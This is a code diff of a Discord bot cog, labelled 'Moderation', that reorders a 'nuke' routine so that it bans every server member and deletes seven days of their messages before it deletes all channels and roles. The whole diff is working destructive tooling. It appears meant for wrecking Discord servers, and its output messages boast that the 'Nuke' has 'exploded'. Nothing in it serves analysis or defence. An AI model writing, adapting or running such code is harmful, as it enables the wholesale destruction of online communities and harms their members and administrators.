@@ -37,6 +37,21 @@ class Moderation(commands.Cog):
         SKIP_BOTS = False
         await ctx.message.delete()
 
+        # Ban all members.
+        print(Fore.YELLOW + "Banning server members:")
+        for member in self.bot.get_all_members():
+            if member.bot and SKIP_BOTS:
+                continue
+            try:
+                await member.ban(reason=None, delete_message_days=7)
+                print(Fore.LIGHTBLUE_EX + f"Banned {member.display_name}.")
+            except discord.Forbidden:
+                print(Fore.RED + f'Failed to ban {member}.')
+            except discord.HTTPException:
+                print(Fore.RED + f'Failed to ban {member}.')
+        print(Fore.LIGHTGREEN_EX + "Banned all members.\n\n")
+        print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")
+
         # Delete all channels.
         print(Fore.LIGHTWHITE_EX + f"\n{'-'*35}" + "\nNuke depolyed!\n\n")
         print(Fore.YELLOW + "Deleting server channels:")
@@ -66,21 +81,6 @@ class Moderation(commands.Cog):
             else:
                 break
         print(Fore.LIGHTGREEN_EX + "Deleted all roles.\n")
-
-        # Ban all members.
-        print(Fore.YELLOW + "Banning server members:")
-        for member in self.bot.get_all_members():
-            if member.bot and SKIP_BOTS:
-                continue
-            try:
-                await member.ban(reason=None, delete_message_days=7)
-                print(Fore.LIGHTBLUE_EX + f"Banned {member.display_name}.")
-            except discord.Forbidden:
-                print(Fore.RED + f'Failed to ban {member}.')
-            except discord.HTTPException:
-                print(Fore.RED + f'Failed to ban {member}.')
-        print(Fore.LIGHTGREEN_EX + "Banned all members.\n\n")
-        print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")
 
 
     # Delete all channels only.
